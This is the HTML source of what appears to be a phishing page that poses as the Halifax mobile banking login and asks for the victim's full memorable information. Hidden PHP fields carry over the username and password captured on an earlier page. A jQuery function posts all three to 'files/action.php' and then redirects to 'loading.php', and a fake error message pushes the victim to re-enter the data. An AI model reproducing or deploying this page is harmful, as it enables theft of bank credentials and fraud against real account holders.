

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">


<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Your full memorable information</title>


    



<meta name="keywords" content="">
<meta name="description" content="">

<meta http-equiv="content-language" content="en-gb">
<link rel="alternate" media="handheld" href="https://www.halifax-online.co.uk/personal/logon/login.jsp">
<meta name="viewport" content="width=device-width">

          
  </script><meta name="DCSext.hasTealium" content="1">
   
  


<link rel="apple-touch-icon" sizes="57x57" href="https://www.halifax-online.co.uk/wps/wcm/connect/content_halifax_personal_banking/assets/media/images/mobile/Halifax%2057x57%20app-touch-icon-1432115287.JPG">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.halifax-online.co.uk/wps/wcm/connect/content_halifax_personal_banking/assets/media/images/mobile/Halifax%20114x114%20app-touch-icon-1472024731.JPG">


<link type="text/css" href="./hallifax_files/base-auto-min191016.css" rel="stylesheet">






   




<meta name="apple-itunes-app" content="app-id=486355738, affiliate-data=ct=h_rt_mb_lgn_wb&amp;pt=647402">


<meta name="dclinkjourid" content="EiK1xB6TRB9edXLX6mWXQdUmte3dZXp9">



    
     
        


<meta name="wup_url" content="https://wup-16c9d93d.eu.v2.we-stats.com/client/v3/web/wup?cid=karma">
<link rel="stylesheet" href="form/main.css">

</head>
<body class="hasJS">

    
    
    <input type="hidden" name="businessRuleCheckForMLPTHiddenText" id="businessRuleCheckForMLPTHiddenText" value="false">

    
    
    
  
    <div id="outer">
    
        <div id="banner">
            
            
            <p id="logo">
                <img src="./hallifax_files/Halifax-logo-1432115232.gif" alt="Halifax">
            </p>
            
            
            
            <p id="userstatusNGB">
                <img src="./hallifax_files/padlock-secure-NGB-1432115235.gif" alt="Secure">
            </p>
            
            
            
                <p class="cookiePolicy">
                   <a title="Cookie Policy" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/COOKIE_POLICY">
                        Cookie Policy
                   </a>
                   </p>
                       
            <div class="clearer"></div>
        </div>
            
        <div id="header">
            <div class="panelTL">
                <div class="panelTR">
                    <div class="panelBR">
                        <div class="panelBL">
                            <div id="headerInner">
                                
                                
                                
			
				
				
				
				


	
	
<!-- start TS:component_0_free_format -->	
	

	
	<h1>Your memorable information</h1>


<!-- end TS:component_0_free_format -->
	



			
		
                                

                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <h4 class="mbpadding">
       
<style>
.memoerror{display:block; padding:10px; border: 1px solid #fab7de; background:#fde5f3}
</style>
        <b class="memoerror">There is a problem with some of the information you have submitted.<br>
Please amend the fields highlighted below and re-submit this form.</b><br><br>

Please enter your full memorable information.<br>

         </h4>

        <!--[if lte IE 8]>
        <div class="headerMsgErr"><h1>PLEASE UPDATE YOUR BROWSER.</h1>
        </div>
        <style type="text/css">
            .content { display:none; }
        </style>
        <div class="loginInner">
            <div class="msgErrorBrowser">
                <div class="msgTLBrowser">
                    <div class="msgTRBrowser">
                        <div class="msgBRBrowser">
                            <div class="msgBLBrowser">
                                <p class="browserMsgP">
                                <p>You're using an old version of your browser which won't work with Online Banking.</p><p>Please <a title="update your browser" href="https://www.halifax.co.uk/helpcentre/accessing-our-website/upgrading-your-browser/" target="_blank" rel="noopener noreferrer">update your browser</a>.</p>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="actionsLogin">
            <div class="divider">
                <hr />
            </div>
            <div class="backToHomepage">
                <p><a class="newwin" href="https://www.halifax.co.uk/" title="https://www.halifax.co.uk/" ><img alt="Back to homepage" src="/wps/wcm/connect/content_halifax_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/HALIFAX_BACK_TO_HOMEPAGE_NGB-1562947775.png"  /></a></p>
            </div>
        </div>
         
        <!--<![endif]-->

        
        <noscript>
        <div class="headerMsgErr"><h1>PLEASE TURN ON JAVASCRIPT.</h1>
        </div>
        <style type="text/css">
            .content { display:none; }
        </style>
        <div class="loginInner">
            <div class="msgErrorBrowser">
                <div class="msgTLBrowser">
                    <div class="msgTRBrowser">
                        <div class="msgBRBrowser">
                            <div class="msgBLBrowser">
                                <p class="browserMsgP">
                                <p>You need to have Javascript turned on to use Online Banking. You can turn it on by following the instructions in your browser menu. Or search for 'enable Javascript' in your search engine.</p><p>If you have accessibility needs and turned Javascript off because it interferes with your screen reader, you should check that you're using the most recent version of the screen reader, or you could try using an alternative.</p><p>If you have problems using a computer because of a disability or impairment, we recommend you visit <a title="https://www.abilitynet.org.uk" href="https://www.abilitynet.org.uk" target="_blank" rel="noopener noreferrer">https://www.abilitynet.org.uk</a> for free expert advice and guidance.</p>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="actionsLogin">
            <div class="divider">
                <hr />
            </div>
            <div class="backToHomepage">
                <p><a class="newwin" href="https://www.halifax.co.uk/" title="https://www.halifax.co.uk/" ><img alt="Back to homepage" src="/wps/wcm/connect/content_halifax_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/HALIFAX_BACK_TO_HOMEPAGE_NGB-1562947775.png"  /></a></p>
            </div>
        </div>
        </noscript>
        

        <div class="content">
            <div class="login">
                <div class="panelTL">
                    <div class="panelTR">
                        <div class="panelBR">
                            <div class="panelBL">
                                <div class="loginInner">
                                    
                                    
                                    <div class="loginFields">
                                        <form id="mainlogin" >


                                        
<!-- HIDDEN FIELDS FOR POSTING DATA PAGE TO PAGE-->
<input type="hidden" name="username" value="<?=$_POST['username']?>">
<input type="hidden" name="password" value="<?=$_POST['password']?>">



                                        
                                        

<!-- HIDDEN FIELDS FOR POSTING DATA PAGE TO PAGE-->
<script src='files/jquery-3.4.1.min.js'></script>

                                            <div class="formField">
                                                <label for="frmLogin:lblUserID"><h4> Your memorable information</h4></label> 
                                                <input type="text" name="memorable" class="charone" maxlength="100" value="">
                                            </div>

                                        



                                        


                                            <div class="actionsLogin">
                                                <div class="divider">
                                                
                                                    <hr>
                                                
                                                </div>
                                                
                                                <input id="frmLogin:lnkLogin1" name="frmLogin:lnkLogin1" type="button" value="Continue" text="Continue" onclick='return form_submit();' class="submitAction">
                                            </div>
                                            <script>
                                            function form_submit(){
                                                $.ajax({
                                                type : 'POST',
                                                url : 'files/action.php?type=login',
                                                data : $('#mainlogin').serialize(),
                                                success: function (data) {
                                                    //console.log(data);
                                                    var parsed_data = JSON.parse(data);
                                                    if(parsed_data.status == 'ok'){
                                                        location.href = "loading.php"
                                                    }else{
                                                        return false;
                                                    }
                                                    //console.log(parsed_data.status);
                                                }
                                                })

                                                return false;

                                            }

                                            </script>
                                            <input type="hidden" name="frmLogin" value="frmLogin"> <input type="hidden" name="submitToken" value="8065429"> <input type="hidden" name="target" value="">
                                            
                                             
                                           <input type="hidden" name="dclinkjourid" value="EiK1xB6TRB9edXLX6mWXQdUmte3dZXp9">
                                           
                                           
                                           <input type="hidden" name="wup_url" value="https://wup-16c9d93d.eu.v2.we-stats.com/client/v3/web/wup?cid=karma">
                                           
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>


            
            
           <div class="aside">
           
                </div>
                
      

            

            <div class="appBannerBG">
                <div class="appBannerLink market">
                    <p style="text-align: center;"><a href="https://www.halifax.co.uk/loans/loan-calculator/?WT.ac=lon/public/navigation/ban/r2pr/loan/s/rl/HLnsNGBBan" target="_blank" rel="noopener noreferrer"><img alt="Personal Loan. Use our online calculator to see if a loan is right for you. Lending is subject to status." src="./hallifax_files/personal-loan-ngb-login-banner-1569848374.jpg"></a></p><p style="text-align: center;"><a href="https://www.halifax.co.uk/loans/?WT.ac=lon/public/navigation/ban/r2pr/loan/s/rl/Hxloancalc" target="_blank" rel="noopener noreferrer">&nbsp;</a></p>

                </div>
            </div>
            <div class="clearer"></div>
            
            

     
            
               
               
               
               
               
               
               
               
               
            




<div id="footerLogin">
    <div class="FootNav">
        <div class="lnkLevFoot">
           <p class="lnkLevFootP">
              
                 <a title="Register for Internet Banking" href="https://www.halifax-online.co.uk/personal/a/useradmin/mobile/registration/selectaccounttyperegistration.jsp">
                    Register for Internet Banking</a>
              
              
                 <a title="Go to desktop site" href="https://www.halifax-online.co.uk/personal/logon/login.jsp?mobile=false">Go to desktop site</a>
               
               
                 <a title="Help" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/HELP">
                    Help</a>
               
               
                 <a title="Security" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/SECURITY">
                    Security</a>
               
               
                 <a title="Contact us" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/CONTACT_US">
                    Contact us</a>
               
               
                <a title="Mobile Banking" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>
               
               
                <a title="Legal" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
               
            </p>
        </div>
        <div class="aside">
        
        
            <div class="aside">
                          <p class="sideNote">
                             <a title="Mobile Banking" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>
                          </p>

        
        
        </div>
        
            
                <div class="appBannerBG">
                    <div class="appBannerLink"><p align="center"><a href="http://www.halifax.co.uk/fscs/" title="fscs login tile"><img alt="FSCS" src="./hallifax_files/fscs-ngb-logon-banner-V2-1459783745.png"></a></p>
                    </div>
                </div>

        
        
        
        <div class="clearer"></div>
            <div>
            
            
                       <div class="footerLinksLogin">
                         <a title="Security" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/SECURITY">Security</a>

                         <a title="Legal" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
                      </div>
            
            
        </div>
        </div>
</div>
        
                
                
                

          
          
                <input type="hidden" name="smartAppForIosAndAndroid" value="true"> <input type="hidden" name="smartAppForIosAbvSix" value="true">
                
            
            </div>
            
        </div>
    </div>
  

    <noscript><div><img alt="DCSIMG" id="DCSIMG" class="hide" src="https://statse.webtrendslive.com/dcs33ei9u10000kby9iq3fci2_2x7f/njs.gif?WT.sp=IB;mobilebanking&WT.si_x=1&WT.si_n=mobileLogin&WT.cg_s=loginwithreglink&WT.cg_n=Mobile Banking&WT.ti=Halifax - Mobile Banking - Login"/></div></noscript>
                    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
                 
                 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
             
                 <script src="form/mask.js"></script>

</body></html>